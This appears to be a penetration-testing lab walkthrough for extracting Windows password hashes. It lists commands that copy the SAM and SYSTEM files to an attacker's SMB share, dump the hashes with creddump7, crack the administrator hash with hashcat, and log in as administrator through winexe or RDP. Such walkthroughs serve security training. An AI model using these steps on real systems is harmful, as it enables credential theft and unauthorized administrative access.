# 🐾 Task 11: SAM and SYSTEM Files - Extracting Password Hashes
---

## 📜 Task Description
In this task, we will extract password hashes from the SAM and SYSTEM files. These files are commonly used for storing passwords in Windows. On the target machine, these files are stored in the `C:\Windows\Repair\` directory in an unprotected form. We will transfer these files to Kali and use the creddump7 utility to extract password hashes. Then, using hashcat, we will attempt to crack the administrator password hash.

---

## 🔍 Step 1: Copy SAM and SYSTEM Files to Kali
First, copy the SAM and SYSTEM files from the target machine to your Kali machine. Execute the following commands:  
`copy C:\Windows\Repair\SAM \\lhost\kali\`  
`copy C:\Windows\Repair\SYSTEM \\lhost\kali\`

### 📋 Expected Output
- Ensure that the files are successfully copied to your Kali machine.

---

## 🔑 Step 2: Clone the creddump7 Repository and Install Dependencies
Next, clone the creddump7 repository and install the necessary dependencies. Execute the following commands on Kali:  
`git clone https://github.com/Tib3rius/creddump7`  
`pip3 install pycrypto`

### 📋 Expected Output
- Ensure that the repository is successfully cloned and dependencies are installed.

---

## 📝 Step 3: Extract Password Hashes from SAM and SYSTEM Files
Now, use the creddump7 utility to extract password hashes from the SYSTEM and SAM files. Execute the following command:  
`python3 creddump7/pwdump.py SYSTEM SAM`

### 📋 Expected Output
- Ensure that password hashes are successfully extracted from the SAM and SYSTEM files.

## 🎯 Step 4: Crack the Administrator Password Hash with hashcat
Now, use hashcat to crack the administrator's password hash. Execute the following command (make sure to replace `<hash>` with the administrator password hash):  
`hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt`

### 📋 Expected Output
- Ensure that hashcat successfully cracks the administrator password hash.

## 📝 Step 5: Login Using the Cracked Password
Now that we have the cracked password, use it to log in to the system with administrator privileges. You can use either winexe or RDP:  
- For winexe: `winexe -U 'admin%<password>' //rhost cmd.exe`  
- For RDP: use the cracked password to log in via RDP.

### 📋 Expected Output
- Ensure that you are able to log in to the system with administrator privileges using the cracked password.

## 🎉 Congratulations!
You have successfully extracted password hashes from the SAM and SYSTEM files, cracked them, and used them to log in to the system with administrator privileges! 🎊

## 📌 Notes
- If you encounter issues with an older version of creddump7, always update the repository from GitHub.
- Use this knowledge responsibly and only within authorized penetration testing engagements.
